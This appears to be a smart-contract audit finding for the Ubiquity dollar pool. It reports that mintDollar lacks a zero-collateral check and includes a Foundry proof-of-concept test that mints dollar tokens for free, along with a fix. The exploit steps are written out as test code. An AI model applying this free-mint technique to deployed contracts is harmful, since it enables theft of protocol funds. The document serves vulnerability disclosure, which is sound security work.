Early Garnet Otter

high

# mintDollar: Free minting of dollar token is available

## Summary

Because there is no check if `collateralNeeded` is zero, the dollar token can minted for free.

## Vulnerability Detail

`LibUbiquityPool.mintDollar` does not check if `collateralNeeded` is zero. This allows attacker to mint dollar token for free without using any collateral when collateral’s decimal is less than dollar token. Also, even if the collateral and dollar token have the same decimal, the same problem can occur if the `collateralPrices` is high.

This vulnerability also allows attacker to mint dollar tokens when the `poolCeilings` is reached. 

```solidity
function mintDollar(
    uint256 collateralIndex,
    uint256 dollarAmount,
    uint256 dollarOutMin,
    uint256 maxCollateralIn
)
    internal
    collateralEnabled(collateralIndex)
    returns (uint256 totalDollarMint, uint256 collateralNeeded)
{
    ...

    // get amount of collateral for minting Dollars
@>  collateralNeeded = getDollarInCollateral(collateralIndex, dollarAmount);

    // subtract the minting fee
    totalDollarMint = dollarAmount
        .mul(
            UBIQUITY_POOL_PRICE_PRECISION.sub(
                poolStorage.mintingFee[collateralIndex]
            )
        )
        .div(UBIQUITY_POOL_PRICE_PRECISION);

    // check slippages
    require((totalDollarMint >= dollarOutMin), "Dollar slippage");
@>  require((collateralNeeded <= maxCollateralIn), "Collateral slippage");

    // check the pool ceiling
@>  require(
        freeCollateralBalance(collateralIndex).add(collateralNeeded) <=
            poolStorage.poolCeilings[collateralIndex],
        "Pool ceiling"
    );

    // take collateral first
@>  IERC20(poolStorage.collateralAddresses[collateralIndex])
        .safeTransferFrom(msg.sender, address(this), collateralNeeded);

    // mint Dollars
    IERC20Ubiquity ubiquityDollarToken = IERC20Ubiquity(
        LibAppStorage.appStorage().dollarTokenAddress
    );
@>  ubiquityDollarToken.mint(msg.sender, totalDollarMint);
}

function getDollarInCollateral(
    uint256 collateralIndex,
    uint256 dollarAmount
) internal view returns (uint256) {
    UbiquityPoolStorage storage poolStorage = ubiquityPoolStorage();
    return
        dollarAmount
            .mul(UBIQUITY_POOL_PRICE_PRECISION)
@>          .div(10 ** poolStorage.missingDecimals[collateralIndex])
@>          .div(poolStorage.collateralPrices[collateralIndex]);
}
```

This is PoC.

1. First, fix MockERC20.sol because there is an error in MockERC20. The original MockERC20 does not set decimals and uses a fixed value of 18, so fix that.
    
    ```diff
    // SPDX-License-Identifier: AGPL-3.0-only
    pragma solidity 0.8.19;
    
    import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    
    contract MockERC20 is ERC20 {
    +   uint8 public decimals_;
    
        constructor(
            string memory _name,
            string memory _symbol,
            uint8 _decimals
        ) ERC20(_name, _symbol) {
    +       decimals_ = _decimals;
        }
    
    +    function decimals() public view override returns (uint8){
    +       return decimals_;
    +    }
    
        function mint(address to, uint256 value) public virtual {
            _mint(to, value);
        }
    
        function burn(address from, uint256 value) public virtual {
            _burn(from, value);
        }
    }
    ```
    
2. In the `setUp` function of the UbiquityPoolFacet.t.sol file, change the decimal of the collateral token to be smaller.
    
    ```diff
    function setUp() public override {
        super.setUp();
    
        vm.startPrank(admin);
    
        // init collateral token
    -   collateralToken = new MockERC20("COLLATERAL", "CLT", 18);
    +   collateralToken = new MockERC20("COLLATERAL", "CLT", 6);
    
        ...
    }
    ```
    
3. Add the following test to UbiquityPoolFacet.t.sol and run it.
    
    ```solidity
    function testMintDollar_PoCShouldMintDollarsForFree() public {
        vm.prank(admin);
        ubiquityPoolFacet.setPriceThresholds(
            1000000, // mint threshold
            990000 // redeem threshold
        );
    
        // balances before
        assertEq(collateralToken.balanceOf(address(ubiquityPoolFacet)), 0);
        assertEq(dollarToken.balanceOf(user), 0);
    
        vm.prank(user);
        (uint256 totalDollarMint, uint256 collateralNeeded) = ubiquityPoolFacet
            .mintDollar(
                0, // collateral index
                999999999999, // Dollar amount
                0, // min amount of Dollars to mint
                0 // max collateral to send
            );
    
        LibUbiquityPool.CollateralInformation memory info = ubiquityPoolFacet
            .collateralInformation(address(collateralToken));
        assertEq(info.missingDecimals, 12);
    
        assertEq(totalDollarMint, 989999999999);
        assertEq(collateralNeeded, 0);
    
        // balances after
        assertEq(collateralToken.balanceOf(address(ubiquityPoolFacet)), 0);
        assertEq(dollarToken.balanceOf(user), 989999999999);
    }
    ```
    

## Impact

Dollar tokens can be minted for free. The larger the decimal difference between the collateral and the dollar token, and the higher the price of the collateral token, the more dollar tokens can be minted for free.

This vulnerability also allows attacker to mint dollar tokens when the `poolCeilings` is reached.

## Code Snippet

[https://github.com/sherlock-audit/2023-12-ubiquity/blob/d9c39e8dfd5601e7e8db2e4b3390e7d8dff42a8e/ubiquity-dollar/packages/contracts/src/dollar/libraries/LibUbiquityPool.sol#L355](https://github.com/sherlock-audit/2023-12-ubiquity/blob/d9c39e8dfd5601e7e8db2e4b3390e7d8dff42a8e/ubiquity-dollar/packages/contracts/src/dollar/libraries/LibUbiquityPool.sol#L355)

[https://github.com/sherlock-audit/2023-12-ubiquity/blob/d9c39e8dfd5601e7e8db2e4b3390e7d8dff42a8e/ubiquity-dollar/packages/contracts/src/dollar/libraries/LibUbiquityPool.sol#L368-L379](https://github.com/sherlock-audit/2023-12-ubiquity/blob/d9c39e8dfd5601e7e8db2e4b3390e7d8dff42a8e/ubiquity-dollar/packages/contracts/src/dollar/libraries/LibUbiquityPool.sol#L368-L379)

## Tool used

Manual Review

## Recommendation

revert when `collateralNeeded` is 0